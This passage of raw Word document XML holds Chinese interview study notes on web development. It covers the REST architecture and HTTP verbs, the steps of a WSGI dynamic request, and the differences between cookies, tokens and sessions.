          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>确定资源的位置，但是需要在</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请求头中，用</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>AcceptContent-Type</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>字段指定，这两个字段是对资源表现的描述。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A272A50"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3.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>状态转换：客户端和服务器交互的过程。在这个过程中，一定会有数据和状态的转化，这种转化叫做状态转换。其中，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>表示获取资源，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>表示新建资源，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>PUT</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>表示更新资源，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>表示删除资源。</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协议中最常用的就是这四种操作方式。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8EFAA2"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RESTful</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>架构：</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5731DBD6"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1.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>每个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>代表一种资源；</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECB896B"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2.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>客户端和服务器之间，传递这种资源的某种表现层；</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51639E32" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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3.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>客户端通过四个</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动词，对服务器资源进行操作，实现表现层状态转换。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B8B336" w14:textId="4CA6D605" w:rsidR="00E912B5"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w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>72</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>简述浏览器通过</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求动态资源的过程</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AED5F35" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1.发送http请求动态资源给web服务器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57661863" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2.web服务器收到请求后通过WSGI调用一个属性给应用程序框架</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79FABA23" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3.应用程序框架通过引用WSGI调用web服务器的方法，设置返回的状态和头信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC51DF1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>4.调用后返回，此时web服务器保存了刚刚设置的信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4115C103" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>5.应用程序框架查询数据库，生成动态页面的body的信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9CAF9F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>6.把生成的body信息返回给web服务器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C010A8" w14:textId="7A9A6189" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>7.web服务器吧数据返回给浏览器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684BE88D" w14:textId="295C1CE8" w:rsidR="00E912B5" w:rsidRPr="008B2DE0" w:rsidRDefault="008B2DE0" w:rsidP="008B2DE0">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>73</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>什么是</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cookie,token</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session?</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>它们之间有什么关系？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43255C2A" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>token令牌，是用户身份的验证方式。最简单的token组成:uid(用户唯一的身份标识)、time（当前时间的时间戳）、sign（签名）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4D832A" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对Token认证的五点认识</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37AD95CF" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一个Token就是一些信息的集合；在Token中包含足够多的信息，以便在后续请求中减少查询数据库的几率；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1958FED8" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2、</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>服务端需要对cookie和HTTP Authrorization Header进行Token信息的检查；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06355361" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3、</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>基于上一点，你可以用一套token认证代码来面对浏览器类客户端和非浏览器类客户端；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CC587A" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>4、</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>因为token是被签名的，所以我们可以认为一个可以解码认证通过的token是由我们系统发放的，其中带的信息是合法有效的；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286B088E" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>5、</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>session会话，代表服务器与浏览器的一次会话过程，这个过程是连续的，也可以时断时续。cookie中存放着一个sessionID，请求时会发送这个ID；session因为请求（request对象）而产生；session是一个容器，可以存放会话过程中的任何对象；session的创建与使用总是在服务端，浏览器从来都没有得到过session对象；session是一种http存储机制，目的是为武装的http提供持久机制。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D33E6F6" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>cookie储存在用户本地终端上的数据，服务器生成，发送给浏览器，下次请求统一网站给服务器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3027C3" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>cookie与session区别cookie数据存放在客户端上，</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>session数据放在服务器上；cookie不是很安全，且保存数据有限；session一定时间内保存在服务器上,当访问增多，占用服务器性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="417226C0" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>session与token作为身份认证，</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>token安全行比session好；Session 认证只是简单的把User 信息存储到Session 里，因为SID 的不可预测性，暂且认为是安全的。这是一种认证手段。 而Token ，如果指的是OAuth Token 或类似的机制的话，提供的是认证和授权</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>认证是针对用户，授权是针对App 。其目的是让 某App有权利访问某用户的信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53457575" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
